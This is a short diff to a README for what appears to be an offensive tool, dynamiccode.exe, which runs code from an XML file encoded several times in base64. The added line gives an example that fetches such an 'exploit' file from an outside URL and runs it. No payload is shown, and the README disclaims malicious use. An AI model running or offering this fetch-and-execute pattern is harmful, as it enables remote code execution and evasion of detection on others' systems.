@@ -12,7 +12,7 @@ These information shall only be used to expand knowledge and not for causing mal
 Example usage
 ==============
 1. just run it with exploit.xml in the directory of the exe
-2. or run it by passing the location of the file with how many iteration the code has been base64 encoded 
+2. or run it by passing the location of the file with how many iteration the code has been base64 encoded example dynamiccode.exe "https://yourexternalsite/yourBase64DataExploit.xml
 
 It is important that the XML have the correct usings and correct version of the .net framework.
 
